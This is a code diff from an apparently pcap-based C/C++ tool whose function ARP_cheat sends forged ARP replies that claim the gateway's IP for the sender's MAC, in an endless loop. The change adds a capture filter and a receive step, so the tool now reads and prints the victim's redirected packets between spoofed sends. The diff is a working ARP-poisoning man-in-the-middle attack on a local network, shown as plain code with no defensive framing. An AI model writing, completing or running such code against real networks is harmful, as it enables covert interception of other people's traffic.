@@ -47,12 +47,13 @@ void SetColor(int ForgC)
 	}
 }
 void package_print(char * pdata,unsigned int p_len){
+	SetColor(2);
 	unsigned int i;
 	if(pdata==0){
 		printf("No package DATA.\n");
 		return;
 	}
-	SetColor(2);
+	
 	printf("<Dst>");
 	for(i=0;i<6;i++){
 		printf("%02x:",(unsigned char)pdata[i]);
@@ -61,7 +62,7 @@ void package_print(char * pdata,unsigned int p_len){
 	for(i=6;i<12;i++){
 		printf("%02x:",(unsigned char)pdata[i]);
 	}
-	SetColor(1);
+	
 	/*
 	for(i=0;i<p_len;i++){
 		if(i%8==0)printf("  ");
@@ -70,20 +71,47 @@ void package_print(char * pdata,unsigned int p_len){
 	}
 	*/
 	printf("\n\n");
+	SetColor(0);
 	
 }
-char * package_Receive(pcap_t * fp){
-    pcap_pkthdr header;
+char * package_Receive(pcap_t * fp,pcap_pkthdr &header){
+
 	char *res;
 	res=(char*)pcap_next(fp, &header);
-	if(res!=NULL)package_print(res,header.len);
+	//if(res!=NULL)package_print(res,header.len);
 	return res;
 }
 void ARP_cheat(pcap_t * fp,unsigned long targetIP,unsigned long gateIP,MAC myMAC,MAC targetMAC,MAC gateMAC){
 	unsigned int package_size=sizeof(MACHeader)+sizeof(ARPHeader);
 	char * pData=new char[package_size];
+
+
+	char *filter=new char[100];
+	strcpy(filter,"ether src ");
+	char tmp_mac[20];
+	MAC_toString(targetMAC,tmp_mac);
+	filter=strcat(filter,tmp_mac);
+	filter=strcat(filter," and ether dst ");
+	MAC_toString(myMAC,tmp_mac);
+	filter=strcat(filter,tmp_mac);
+	SetFilter(fp,filter);
+
 	ARP_MakePackage(pData,ARP_OP_REPLY,myMAC,targetMAC,gateIP,getIP("0.0.0.0"));
+	int timer=0;
+	char *recvData;
+	pcap_pkthdr tmp_header;
 	while(1){
-		send_raw_package(fp,(u_char *)pData,package_size,1);
+		timer=(timer+1)&0x0f;
+		if(timer==0){
+			recvData=package_Receive(fp,tmp_header);
+			while(recvData!=NULL){
+				package_print(recvData,tmp_header.len);
+				recvData=package_Receive(fp,tmp_header);
+			}
+		}else{
+			send_raw_package(fp,(u_char *)pData,package_size,1);
+		}
+
+
 	}
 }
